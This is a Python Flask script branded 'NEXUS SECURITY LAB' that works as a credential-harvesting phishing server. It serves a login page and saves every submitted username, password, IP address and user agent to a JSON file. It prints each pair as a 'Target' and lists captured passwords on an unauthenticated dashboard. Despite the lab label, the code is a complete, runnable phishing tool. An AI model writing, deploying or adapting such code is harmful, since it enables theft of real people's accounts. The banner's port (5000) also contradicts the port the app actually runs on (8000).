#!/usr/bin/env python3
from flask import Flask, render_template, request
import json
import os
import datetime

app = Flask(__name__)
LOG_FILE = "logs/captures.json"
os.makedirs("logs", exist_ok=True)
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        json.dump([], f)

def save_attempt(username, password, ip, user_agent):
    data = {
        "timestamp": str(datetime.datetime.now()),
        "username": username,
        "password": password,
        "ip": ip,
        "user_agent": user_agent
    }
    with open(LOG_FILE, "r") as f:
        logs = json.load(f)
    logs.append(data)
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=4)
    print(f"[!] 🎯 Target: {username}:{password}")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    save_attempt(username, password, ip, user_agent)
    return """
    <html><head><title>NEXUS</title></head>
    <body style="background:#0a0a1a;color:#00ffcc;font-family:monospace;text-align:center;padding-top:50px;">
        <h1>🧸 NEXUS</h1>
        <h2 style="color:#ff4444;">⚠️ WELCOME TO OUR WORLD, GUEST, WAIT FOR OUR ANSWERS ⚠️</h2>
        <p>KNOWLEDGE OVER CHAOS.</p>
        <a href="/" style="color:#00ffcc;">Rudi</a>
    </body></html>
    """

@app.route('/dashboard')
def dashboard():
    with open(LOG_FILE, "r") as f:
        logs = json.load(f)
    html = """<html><head><title>NEXUS Dashboard</title>
    <style>body{background:#0a0a1a;color:#00ffcc;font-family:monospace;padding:20px;}
    table{width:100%;border-collapse:collapse;margin-top:20px;}
    th,td{border:1px solid #00ffcc;padding:10px;text-align:left;}
    th{background:#1a1a2e;color:#fff;}
    .back{color:#00ffcc;text-decoration:none;font-size:18px;}</style></head>
    <body><h1>📊 Dashboard</h1><a href="/" class="back">← Rudi</a>
    <table><tr><th>Muda</th><th>Jina</th><th>Nenosiri</th><th>IP</th></tr>"""
    for log in logs[-20:]:
        html += f"<tr><td>{log['timestamp']}</td><td>{log['username']}</td><td>{log['password']}</td><td>{log['ip']}</td></tr>"
    html += f"</table><p style='color:#555;'>Jumla: {len(logs)}</p></body></html>"
    return html

if __name__ == '__main__':
    print("\n╔════════════════════════════════════════╗")
    print("║    🧸 NEXUS SECURITY LAB v2.0         ║")
    print("║    Built by Luiz Vad                  ║")
    print("║    \"Jifunze. Elewa. Linda.\"           ║")
    print("╚════════════════════════════════════════╝\n")
    print("[✓] NEXUS: http://localhost:5000")
    print("[✓] Dashboard: http://localhost:5000/dashboard")
    app.run(debug=True, host='0.0.0.0', port=8000)
